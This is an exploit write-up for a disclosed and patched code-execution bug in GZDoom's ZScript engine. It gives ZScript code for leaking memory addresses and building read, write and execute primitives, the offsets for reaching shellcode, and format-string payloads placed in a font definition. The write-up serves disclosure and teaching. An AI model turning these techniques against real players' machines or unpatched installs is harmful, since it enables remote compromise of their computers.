# GZDoom <= 4.13.1 Arbitary Code Execution via Malicious ZScript
A proof of concept for an arbitrary code execution vulnerability I found in GZDoom's (https://github.com/zdoom/gzdoom) ZScript functionality. An attacker can share a PK3 file containing a malicious ZScript source file and gain access to the victim's PC.

Big thank-you to Rachael and Agent Ash on the GZDoom dev team for their prompt responses, and to them and the other GZDoom devs for swiftly addressing this!

## Affected versions
Confirmed to work for 4.13.0 and 4.13.1, and this probably works for earlier versions too. **Be wary of anybody telling you to downgrade to version 4.13.1 or below to be able to play their WAD.**

This PoC works only on Linux, but the vulnerability likely exists on Windows too. Not tested on ZDoom or LZDoom, but the vulnerability may exist there as well.

The vulnerability has been disclosed to the devs before this PoC's publication and it should no longer be present for version 4.13.2. To the best of my knowledge, this version does not include any practical breaking changes.

## Disclaimer
This PoC is made and released for educational purposes, so that game/scripting engine developers may understand how vulnerabilities can arise and so that players may understand what a malicious game mod can look like. I am not responsible or liable for any misuse of this PoC. Please do not use this to compromise your fellow gamers' PCs; it is illegal (you should not need me to tell you that), and it is especially a dirtbag move to take over somebody's computer through a video game.

# Explanation
*NOTE: This is my first exploit writeup and I'm still working on my skill to do low-level writeups. Also, I did much of my debugging with GDB, and unfortunately I didn't have the good sense to save some memory dumps to illustrate my explanation better. Sorry! My next writeup will be better, I promise.*

GZDoom is a Doom source port designed for performance and extensibility. Thanks to its powerful features, many awesome WADs, mods, and even commercial total conversions have been made. Unfortunately, where there is complexity, there is the opportunity for vulnerabilities, and in this case there were two present in the ZScript scripting engine that allowed a full exploit chain to arise.

This attack defeats ASLR and sidesteps the need to defeat stack canaries. I don't think Clang's CFI or shadow stacks would have helped here.

## Vulnerabilities
The first and most important vulnerability was in how huge arrays were handled. If you allocate a small-enough array, the allocated region of memory tends to be filled with zeroes and is properly separated from other objects; no information can be gained from reading uninitialized memory, and no objects overlap with the array. However, if you allocate a huge array - say, 1073741823 32-bit words or more - you will be able to **read and write up to 4 GiB of potentially uninitialized memory from the array's starting point, allowing the attacker to directly modify other objects and defeat ASLR by finding addresses having known offsets**. Additionally, **any other arrays created past this point will overlap with the huge one**.

The second vulnerability was in memory map permissions. For faster performance, ZScript code is JIT-compiled to x86 or x86-64 bytecode whenever possible. In order to have this, the code must be written to a region of memory, and that region of memory must be executed. However, the W^X rule states that a region should be either writable or executable, but not both. If both are applied at the same time (instead of making the region writable, writing the code, and then making the region executable and unwritable), then an attacker with an arbitrary write primitive will be able to escalate it to an arbitrary code execution; they can write shellcode and jump to it by e.g. modifying the return address on the stack (assuming the attacker doesn't have an arbitrary execute primitive). If you look at the memory mappings for GZDoom when it's running, you can see there are several RWX regions:
```
7fcd19700000-7fcd19800000 rwxp 00000000 00:00 0
7fcd1a100000-7fcd1a200000 rwxp 00000000 00:00 0
7fcd1eb00000-7fcd1ec00000 rwxp 00000000 00:00 0
```
So **if arbitrary write and arbitrary execute primitives are available, and the attacker knows where any RWX region is present, they can write arbitrary shellcode and execute it**. Making these regions RW- when writing the JIT-compiled code and then R-X when ready to run would stop *this* PoC, but it would not stop an attacker from gaining code execution by, for example, modifying data on the stack (ROP) or heap.

## Gadgets
Additionally, there is a useful gadget. Remember how when allocating a huge array, any other arrays created after it will overlap? That includes arrays of object pointers. Much like C++ objects, ZScript objects can contain variables and function pointers. Suppose we have this object:
```
class WeirdObject
{
        uint one;
        uint two;
        uint three;
        uint four;
        Function<clearscope void()> funcptr;
}
```
If we create an array containing a pointer to a WeirdObject instance, then **the attacker can change the pointer to wherever we want using the huge array and change the pointed data by accessing the object's fields, giving us an arbitrary read/write primitive going beyond the heap**. Pointers in ZScript are checked to ensure they're not null, but not to ensure that they're sane.

The presence of a function pointer also gives us **an arbitrary execute primitive**; that, however, is a little less straightforward, requiring the creation of a fake VMFunction to satify the virtual machine. As soon as a call to a ZScript function is introduced in the exploit code, that code is no longer JIT-compiled. Still works, but it becomes a bit more of a headache to debug and exploit. There might be a better way to do this part, but I didn't study the GZDoom internals well enough to know of it.

One thing to note: WeirdObject has inherited member variables, so the first member starts at offset 0x28.

## Exploit
So now, we have the following tools:
- Arbitrary read/write for a huge region of the heap
- Arbitrary read/write/execute going beyond the heap
- RWX regions

How do we chain them to make an exploit?

First, because ASLR's enabled, we need to identify where an RWX region is present. Any will do. The part of the heap available to the huge array contains addresses pointing to functions within an RWX region, but it also has addresses pointing to other regions; how do we discriminate? Recall that on Linux, ASLR has 28 bits of entropy (sometimes less!), meaning that although bits of the mask 0x7fffffe00000 in an address will be random, bits 0x0000001fffff will be static. So, with ASLR disabled, let's assume we have the following RWX regions:
```
[0x7ffff2f00000, 0x7ffff3000000)
[0x7ffff3900000, 0x7ffff3a00000)
[0x7ffff4300000, 0x7ffff4400000)
```
Then we can use the following ZScript code to print pointers to JIT-compiled ZScript functions within the RWX regions:
```
uint u32pBFA9000[1073741823];
uint u32RWX_L;
uint u32RWX_H;

for (i = 0; i < (1073741823 / 2); i += 2)
{
	u32RWX_L = u32pBFA9000[i];
	u32RWX_H = u32pBFA9000[i+1];

	if ((u32RWX_H & 0xffff8000) == 0)
	{
		if ((u32RWX_L & 0xffe00000) == 0xf2e00000)
		{
			Console.Printf("0x%x%08x", u32RWX_H, u32RWX_L);
		}
		if ((u32RWX_L & 0xffe00000) == 0xf3800000)
		{
			Console.Printf("0x%x%08x", u32RWX_H, u32RWX_L);
		}
		if ((u32RWX_L & 0xffe00000) == 0xf4200000)
		{
			Console.Printf("0x%x%08x", u32RWX_H, u32RWX_L);
		}
	}
}
```
Get the offsets by ANDing the printed results with 0x1fffff, and you can use these offsets to identify pointers to RWX regions. The more offsets you know, the greater the chances of the exploit succeeding.

Next, we need to prepare the arbitrary execute primitive. We do that by modifying the function pointer in a gadget object, like the WeirdObject declared above, using an arbitrary write primitive. After u32pBFA9000 is declared, start by creating the arbitrary write and execute gadget objects:
```
WeirdObject ppGadgetObjects[2];
ppGadgetObjects[0] = New("WeirdObject");        // Arbitrary write pointer.
ppGadgetObjects[1] = New("WeirdObject");        // Arbitrary execute object.
```
ppGadgetObjects overlaps with u32pBFA9000 right at the beginning, and remember that the WeirdObject-specific members start at offset 0x28. The arbitrary write primitive looks like this, where `TARGET_ADDR` is the target write address, `QWORD` is the 64-bit integer to write, and `_H/_L` indicate the high and low 32 bits of a 64-bit int respectively:
```
u32pBFA9000[0] = (TARGET_ADDR_L-0x28);
u32pBFA9000[1] = TARGET_ADDR_H;
ppGadgetObjects[0].one = QWORD_L;
ppGadgetObjects[0].two = QWORD_H;
```
I will admit that I don't know enough about how ZScript's function pointers work and this part I still find hard to explain, but I'll try my best to explain anyway. Sorry if I confuse you further.
- At offset 0x38 of the execute gadget WeirdObject's function pointer destination is a pointer to a class/struct I could not identify.
- At offset 0x8 of this unidentified class/struct is a pointer to a VMFunction.
- At offset 0xc of the VMFunction is the 32-bit VarFlags member. Setting it to zero makes a shorter path to calling the shellcode.
- At offset 0x58 of the VMFunction is the actual pointer to the function to be called.

I really should write a diagram for this, but right now I don't feel like doing ASCII art. See the exploit source code to see what the above looks like.
Once the above is sorted out, we then can modify the function pointer in the gadget object. When we call it, it will execute our shellcode once it's written.

The last step is writing the shellcode itself. Since this PoC calls a shell command, some strings ("/bin/bash", "-c", the command string) need to be written as well. This part could be easy or hard, depending on just what you intend to execute.

When all that is done, you call the function pointed to by the execute gadget WeirdObject, and you now have executed your own shellcode.

# Notes on additional potential vulnerabilities
I did find some additional vulnerabilities, but could not find a way to exploit them and give a full ACE chain. The `strcpy()` stack overflow vulnerability has been fixed in version 4.13.2. The `mysnprintf()` format string vulnerability has not been fixed so far, but GL HF if you're gonna try to exploit it.

## Format string vulnerability
There is a format string vulnerability (two, actually) in the `FFont` constructor in `common/fonts/font.cpp`:
```
[...]
if (nametemplate != nullptr)
{
	if (!iwadonly)
	{
		for (i = 0; i < lcount; i++)
		{
			int position = lfirst + i;
			mysnprintf(buffer, countof(buffer), nametemplate, i + start);

			lump = TexMan.CheckForTexture(buffer, ETextureType::MiscPatch);
			[...]
		}
	}
	else
	{
		FGameTexture *texs[256] = {};
		if (lcount > 256 - start) lcount = 256 - start;
		for (i = 0; i < lcount; i++)
		{
			TArray<FTextureID> array;
			mysnprintf(buffer, countof(buffer), nametemplate, i + start);

			TexMan.ListTextures(buffer, array, true);
			[...]
		}
		[...]
	}
	[...]
}
[...]
```
The `TEMPLATE` argument from an entry in the `FONTDEFS` lump is passed directly to `mysnprintf()`. This means one can have an entry like this that tries to load a font based on stack variables:
```
EVILFONT
{
	TEMPLATE LOL%hhx
}

```
Or an entry that writes the number of characters written somewhere on the stack, causing a crash:
```
EVILFONT
{
        TEMPLATE ----AAAAAAAA%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%hhx%n
}

```
The fact that the output is limited does not matter; the percent symbols will get parsed no matter the maximum length.

`mysnprintf()` is a custom, public domain implementation of `snprintf()` that is designed for performance at the cost of flexibility. Exploiting it is much harder than libc's standard implementation. For example, using %n, you can only write 32-bit words and you cannot write specific stack elements using `%<num>$n`.

# strcpy() stack smashing
There is also a risky call to `strcpy()` in `LevelStatEntry()` in `gamedata/statistics.cpp` whose source may be longer than the destination. The function:
```
static void LevelStatEntry(FSessionStatistics *es, const char *level, const char *text, int playtime)
{
	FLevelStatistics s;
	time_t clock;
	struct tm *lt;

	time (&clock);
	lt = localtime (&clock);

	strcpy(s.name, level);
	strcpy(s.info, text);
	s.timeneeded=playtime;
	es->levelstats.Push(s);
}
```
The `FLevelStatistics` struct, allocated on the stack, looks like so:
```
struct FLevelStatistics
{
	char info[60];
	short skill;
	short playerclass;
	char name[24];
	int timeneeded;
};
```
And `LevelStatEntry()` is called like so, using `LevelData.Levelname` - which is of type `std::string` - as an argument:
```
[...]
for(unsigned i = 0; i < LevelData.Size(); i++)
{
	FString lsection = LevelData[i].Levelname;
	^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
	lsection.ToUpper();
	infostring.Format("%4d/%4d, %4d/%4d, %3d/%3d",
		 LevelData[i].killcount, LevelData[i].totalkills, LevelData[i].itemcount, LevelData[i].totalitems, LevelData[i].secretcount, LevelData[i].totalsecrets);

	LevelStatEntry(es, lsection.GetChars(), infostring.GetChars(), LevelData[i].leveltime);
			   ^^^^^^^^^^^^^^^^^^^
}
SaveStatistics(statfile, EpisodeStatistics);
[...]
```
There's a whole chain of other calls needed to get to this point, starting from `FLevelLocals::ChangeLevel()` in `g_level.cpp`, but I won't bother showing it here. I will say that along the execution chain to get here, there are no checks nor limits against the length of `LevelData.Levelname`.

On a modern system, this shouldn't be exploitable; stack canaries will stop any stack smashing attempts through this dead in their tracks, and ASLR will prevent the user from knowing where to return. Also, you only get one gadget: overwriting the return address when exiting LevelStatEntry(). On older systems, however, these defenses may not be available, and perhaps JIT-compiled ZScript code may provide gadgets for exploitation.
